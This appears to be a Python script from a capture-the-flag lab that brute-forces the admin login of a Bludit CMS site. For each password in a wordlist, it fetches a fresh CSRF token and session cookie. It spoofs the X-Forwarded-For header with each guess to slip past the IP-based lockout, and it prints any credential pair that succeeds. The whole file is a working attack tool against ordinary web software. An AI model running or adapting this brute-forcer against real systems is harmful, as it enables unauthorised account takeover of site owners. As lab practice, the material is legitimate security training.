import sys
import os
import re
import requests

# Usage: while read -r line; do python3 login.py $line; done < words.txt

# set constant variables
HOST = "10.129.241.199"
USER = "fergus"
# setup proxy to view requests in burp
PROXY = { 'http' : '127.0.0.1:8080' }

# initial session to retrieve the session cookies and csrf token
def init_session():
    # RETURN CSRF + session (cookie)
    r = requests.get(f'http://{HOST}/admin/')
    # re to find csrf
    csrf = re.search(r'type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-f0-9]*)"', r.text)
    csrf = csrf.group(1)
    session = r.cookies.get('BLUDIT-KEY')
    return csrf, session

def login(user, password):
    # grab csrf token and session cookie
    csrf, session = init_session()
    cookies = {'BLUDIT-KEY':session}
    header = {'X-Forwarded-For':password}
    # set the parameters in the POST request
    payload = {'tokenCSRF' : csrf, 'username' : user, 'password' : password, 'save':''}
    # login request
    r = requests.post(f'http://{HOST}/admin/login', data=payload, cookies=cookies, proxies=PROXY, allow_redirects=False, headers=header)
    # a successful login attempt does not result in a 200 code, but incorrect ones do
    if r.status_code != 200:
        print(f'{user}:{password}')
        return True
    elif "password incorrect" in r.text:
        return False

# make the reqeuest
r = login(USER,sys.argv[1])


